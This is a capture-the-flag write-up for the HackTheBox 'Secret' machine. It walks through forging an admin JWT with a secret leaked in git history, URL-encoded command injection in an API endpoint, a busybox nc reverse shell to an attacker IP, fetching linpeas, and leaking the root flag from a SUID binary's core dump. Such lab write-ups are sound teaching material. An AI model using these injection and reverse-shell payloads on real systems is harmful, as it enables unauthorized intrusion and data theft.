# Secret - Easy

```sh
sudo vim /etc/hosts
# add secret.htb

nmap -T4 -p- -A -Pn -v secret.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    * 80/tcp - http - nginx 1.18.0
    * 3000/tcp - http - Node.js (Express middleware)

* the webpage on port 80 is a page for 'DUMB Docs' - a documentation webapp

* the website mentions that it uses an API-based system for its functionality, and has a live demo linked at '/api' - but it leads to a 404 page

* the webpage also offers an option to download the source code from 'http://secret.htb/download/files.zip' - so we can download this and check for any secrets

* the website also has a '/docs' page linked for its own documentation, which includes the following info:

    * to register user, we can do a POST call to 'http://localhost:3000/api/user/register' with an example JSON body given:

        ```json
        {
            "name": "dasith",
            "email": "root@dasith.works",
            "password": "Kekc8swFgD6zU"
        }
        ```
    
    * to login user, we can do a POST call to 'http://localhost:3000/api/user/login' with an example JSON body given:

        ```json
        {
            "email": "root@dasith.works",
            "password": "Kekc8swFgD6zU"
        }
        ```
    
    * if the login is successful, we should get an auth-token in the header, which can be used to access a private route using a GET request at 'http://localhost:3000/api/priv' - with the header for 'auth-token' and the token value from the login request

    * the private route can be used to verify if a user is admin or not

* the webpage on port 3000 has the same website - and the same source code ZIP file as verified by its hash

* checking the source code from the ZIP file:

    ```sh
    mkdir dumbdocs

    mv files.zip dumbdocs/

    cd dumbdocs/

    unzip files.zip

    ls -la

    cd local-web

    ls -la
    # check all files

    git log

    git show e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
    # check each commit from the committed logs
    ```

* findings from the source code:

    * the '.env' file shows MongoDB is used in the backend, and could be running locally on port 27017 for a DB 'auth-web', and the token secret is just 'secret'

    * the ```routes/private.js``` file discloses an username 'theadmin' for the role of 'admin'; the same file also discloses another API endpoint at '/api/logs' - as seen in this snippet:

        ```js
        router.get('/priv', verifytoken, (req, res) => {
        // res.send(req.user)

            const userinfo = { name: req.user }

            const name = userinfo.name.name;
            
            if (name == 'theadmin'){
                res.json({
                    creds:{
                        role:"admin", 
                        username:"theadmin",
                        desc : "welcome back admin,"
                    }
                })
            }
            else{
                res.json({
                    role: {
                        role: "you are normal user",
                        desc: userinfo.name.name
                    }
                })
            }
        })


        router.get('/logs', verifytoken, (req, res) => {
            const file = req.query.file;
            const userinfo = { name: req.user }
            const name = userinfo.name.name;
            
            if (name == 'theadmin'){
                const getLogs = `git log --oneline ${file}`;
                exec(getLogs, (err , output) =>{
                    if(err){
                        res.status(500).send(err);
                        return
                    }
                    res.json(output);
                })
            }
            else{
                res.json({
                    role: {
                        role: "you are normal user",
                        desc: userinfo.name.name
                    }
                })
            }
        })
        ```

    * ```git log``` shows there are multiple commits - we can check each commit for any clues

    * checking one of the commits discloses the actual token secret for MongoDB as 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE'

* with this context, we can now try to interact with the API as the documentation suggests:

    ```sh
    curl http://secret.htb:3000/api/user/register -X POST -H 'Content-Type: application/json' -d '{"name":"testuser","email":"test@test.com","password":"testpass"}'
    # creates 'testuser'

    curl http://secret.htb:3000/api/user/login -X POST -H 'Content-Type: application/json' -d '{"email":"test@test.com","password":"testpass"}'
    # login for 'testuser', and we get a JWT

    # use the JWT in the private route
    curl http://secret.htb:3000/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2OTk5ZjBiZDVmOWY5YjA0NzYzZDIzMDEiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJpYXQiOjE3NzE2OTYzMzl9.7KASRJQiJI--NITQiO3C7Ss0iVD2EKKQt2IaEnfYEEQ'
    # this confirms we are a normal user
    ```

* now, the token and the password snippets given in the documentation example do not work and we are unable to login as 'theadmin' user, but the error messages confirm that the email 'root@dasith.works' exists:

    ```sh
    curl http://secret.htb:3000/api/user/login -X POST -H 'Content-Type: application/json' -d '{"email":"theadmin@secret.htb","password":"Kekc8swFgD6zU"}'
    # this gives the error '"email" must be a valid email'

    curl http://secret.htb:3000/api/user/login -X POST -H 'Content-Type: application/json' -d '{"email":"root@dasith.works","password":"Kekc8swFgD6zU"}'
    # but this gives the error 'password is wrong'
    ```

* checking the source code for any further context, we get the logic for the JWT (JSON Web Token) generation in the file ```routes/auth.js```, in the following code snippet:

    ```js
    router.post('/login', async  (req , res) => {

        const { error } = loginValidation(req.body)
        if (error) return res.status(400).send(error.details[0].message);

        // check if email is okay 
        const user = await User.findOne({ email: req.body.email })
        if (!user) return res.status(400).send('Email is wrong');

        // check password 
        const validPass = await bcrypt.compare(req.body.password, user.password)
        if (!validPass) return res.status(400).send('Password is wrong');


        // create jwt 
        const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
        res.header('auth-token', token).send(token);

    })
    ```

* this shows that the JWT generation requires the user ID, username, user email, and the token secret

* we can use [the JWT decoder/encoder website](https://www.jwt.io/) to get the user ID from the previously listed example in the documentation, and generate a new JWT:

    * if we feed the token 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg' from the website into the JWT Decoder, we get the following attributes:

        ```json
        {
        "_id": "6114654d77f9a54e00f05777",
        "name": "theadmin",
        "email": "root@dasith.works",
        "iat": 1628727669
        }
        ```
    
    * in the JWT Encoder, if we feed the same data payload as above, and use the token secret leaked from the git commit 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' to sign JWT, we get the updated JWT value 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'

* as we have a valid signed JWT, we can use this again to interact with the private API:

    ```sh
    curl http://secret.htb:3000/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
    # this works, and we get the JSON response
    # '{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}'
    ```

* as the JWT is confirmed to work for 'theadmin' user, we can use it to interact with the '/api/logs' endpoint

* checking the source code file in ```routes/private.js```, we can see that the '/api/logs' endpoint needs a query parameter 'file', and if 'theadmin' user is interacting with it, it executes the command ```git log --oneline ${file}``` using the ```exec``` function

* the ```git log --oneline ${file}``` command is used to show all commits associated with the given filename, in a single line

* this command itself may not be useful for getting any info, as it only shows the commit messages - but we can still check it:

    ```sh
    curl http://secret.htb:3000/api/logs?file=.env -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
    # it works, and shows the commit associated with the '.env' file

    curl http://secret.htb:3000/api/logs?file=routes/private.js -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
    # works for other files with multiple commits as well

    # if we try to refer a non-existent file it fails
    ```

* as the ```exec``` functionality is involved, it is directly executing the command - this means we have scope for RCE:

    * we can first try LFI - try reading files outside of the directory:

        ```sh
        curl http://secret.htb:3000/api/logs?file=/etc/passwd -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
        # this does not work

        curl http://secret.htb:3000/api/logs?file=../../../../etc/passwd -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
        # this also does not work
        ```
    
    * the code snippet for the '/api/logs' endpoint shows that the ```exec``` functionality will be triggered only if there is a valid file found; otherwise it prints the error
    
    * we can try for RCE, by injecting characters like ```'```, ```"```, ```;```, etc. - followed by the command itself

    * we need to URL-encode the characters, as without URL encoding the command is not parsed:

        ```sh
        curl http://secret.htb:3000/api/logs?file=.env%60id -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
        # trying with URL-encoded tilde - this does not work

        curl http://secret.htb:3000/api/logs?file=.env%22id -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
        # trying with URL-encoded double quotes
        # this also does not work

        curl http://secret.htb:3000/api/logs?file=.env%3Bid -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
        # trying with URL-encoded semicolon
        # this works, and we get the output of 'id'
        ```

* this confirms RCE using URL-encoded ```;``` - ```%3B``` for the '/api/logs' endpoint

* we can use this to get reverse shell - we can test with common URL-encoded revshell one-liners:

    ```sh
    nc -nvlp 4444
    # setup listener

    curl http://secret.htb:3000/api/logs?file=.env%3Bbusybox%20nc%2010.10.14.95%204444%20-e%20sh -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
    # uses the URL-encoded revshell one-liner
    # 'busybox nc 10.10.14.95 4444 -e sh'

    # this works and we get reverse shell
    ```

* in reverse shell:

    ```sh
    id
    # 'dasith' user

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/home/dasith/local-web'

    ls -la
    # web config files

    cd

    ls -la

    cat user.txt
    # user flag
    ```

* for basic enumeration, we can use ```linpeas``` - fetch the script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-89-generic, Ubuntu 20.04.3
    * port 27017 is listening locally - likely running MongoDB
    * non-default files found in ```/opt```
    * unknown binary ```/opt/count``` has SUID bit set

* checking the files in ```/opt```:

    ```sh
    ls -la /opt
    # we have a few files

    cat /opt/code.c
    # C code for the 'count' SUID binary

    cat /opt/valgrind.log
    # shows logs for 'count'

    cat /opt/.code.c.swp
    # Vim swap file
    ```

* from the logs, it seems the 'count' binary takes a source file or directory name as user input, and counts the total characters, words and lines - and can also save the results to a file

* checking the code for the binary:

    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <dirent.h>
    #include <sys/prctl.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <linux/limits.h>

    void dircount(const char *path, char *summary)
    {
        DIR *dir;
        char fullpath[PATH_MAX];
        struct dirent *ent;
        struct stat fstat;

        int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

        if((dir = opendir(path)) == NULL)
        {
            printf("\nUnable to open directory.\n");
            exit(EXIT_FAILURE);
        }
        while ((ent = readdir(dir)) != NULL)
        {
            ++tot;
            strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
            strcat(fullpath, "/");
            strncat(fullpath, ent->d_name, strlen(ent->d_name));
            if (!lstat(fullpath, &fstat))
            {
                if(S_ISDIR(fstat.st_mode))
                {
                    printf("d");
                    ++directories;
                }
                else if(S_ISLNK(fstat.st_mode))
                {
                    printf("l");
                    ++symlinks;
                }
                else if(S_ISREG(fstat.st_mode))
                {
                    printf("-");
                    ++regular_files;
                }
                else printf("?");
                printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
                printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
                printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
                printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
                printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
                printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
                printf((fstat.st_mode & S_IROTH) ? "r" : "-");
                printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
                printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
            }
            else
            {
                printf("??????????");
            }
            printf ("\t%s\n", ent->d_name);
        }
        closedir(dir);

        snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
        printf("\n%s", summary);
    }


    void filecount(const char *path, char *summary)
    {
        FILE *file;
        char ch;
        int characters, words, lines;

        file = fopen(path, "r");

        if (file == NULL)
        {
            printf("\nUnable to open file.\n");
            printf("Please check if file exists and you have read privilege.\n");
            exit(EXIT_FAILURE);
        }

        characters = words = lines = 0;
        while ((ch = fgetc(file)) != EOF)
        {
            characters++;
            if (ch == '\n' || ch == '\0')
                lines++;
            if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
                words++;
        }

        if (characters > 0)
        {
            words++;
            lines++;
        }

        snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
        printf("\n%s", summary);
    }


    int main()
    {
        char path[100];
        int res;
        struct stat path_s;
        char summary[4096];

        printf("Enter source file/directory name: ");
        scanf("%99s", path);
        getchar();
        stat(path, &path_s);
        if(S_ISDIR(path_s.st_mode))
            dircount(path, summary);
        else
            filecount(path, summary);

        // drop privs to limit file write
        setuid(getuid());
        // Enable coredump generation
        prctl(PR_SET_DUMPABLE, 1);
        printf("Save results a file? [y/N]: ");
        res = getchar();
        if (res == 121 || res == 89) {
            printf("Path: ");
            scanf("%99s", path);
            FILE *fp = fopen(path, "a");
            if (fp != NULL) {
                fputs(summary, fp);
                fclose(fp);
            } else {
                printf("Could not open %s for writing\n", path);
            }
        }

        return 0;
    }
    ```

* we can try running the binary to check ```/root```:

    ```sh
    /opt/count
    # input directory '/root'
    # this lists the directory contents
    ```

* the 'count' binary is able to list the '/root' directory contents - so it has permissions to read that directory

* we can try checking for a file in the '/root' directory - this also works, but it only gets the count values

* the results can be saved to a file, but it just saves the count values to a file

* checking the code, the line ```prctl(PR_SET_DUMPABLE, 1);``` shows that core dump is enabled, which means if the program crashes, the coredump is generated

* Googling shows that by default, core dumps are generated and stored in the directories ```/var/lib/systemd/coredump/``` and ```/var/crash```

* we can check if there are any previous core dumps:

    ```sh
    ls -la /var/lib/systemd/coredump/
    # no files

    ls -la /var/crash
    # we have two crash files here
    # but we do not have read permissions
    ```

* to generate a new core dump, we need to crash the program, or trigger a crash by sending the ```SIGSEGV``` (segmentation fault) signal which kills the program

* in order to send the crash signal, we need another terminal - so we need to get reverse shell on another listener as well:

    ```sh
    # on attacker
    nc -nvlp 5555
    # setup another listener

    curl http://secret.htb:3000/api/logs?file=.env%3Bbusybox%20nc%2010.10.14.95%205555%20-e%20sh -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo'
    # use the same payload as before, but change the port number
    ```

* as we have another terminal from which we can kill the program, we can attempt this:

    * in first reverse shell, run the SUID binary:

        ```sh
        /opt/count
        # enter the source file as '/root/root.txt'
        # when it prompts to save results, do not enter anything
        ```
    
    * keep the program running in the first terminal by ignoring the prompt to save results

    * in second reverse shell, find the process ID for the 'count' binary and send the crash signal:

        ```sh
        # in second terminal
        ps -aux | grep count
        # this gives the PID '50270'

        kill -SIGSEGV 50270
        # send the segmentation fault signal
        ```
    
    * back in the first terminal, we can now see the program crashed with the error "Segmentation fault (core dumped)"

    * we can check the coredump now:

        ```sh
        ls -la /var/crash
        # new core dump is generated

        cat /var/crash/_opt_count.1000.crash
        # this gives a lot of base64-encoded content
        # but cannot be read directly by decoding
        ```
    
    * for checking crash files, we can use tools like [apport and gdb](https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash):

        ```sh
        which apport-unpack
        # installed on target

        apport-unpack /var/crash/_opt_count.1000.crash /tmp/testdir
        # unpacks the crash file into a readable format

        ls -la /tmp/testdir
        # lists all files from the crash
        # we need to check the core dump

        cat /tmp/testdir/CoreDump
        # this contains a lot of text, but the root flag string is leaked
        ```
    
    * from the 'CoreDump' file extracted from the crash report, we are able to get the root flag in cleartext - we can also use ```strings``` to read the file
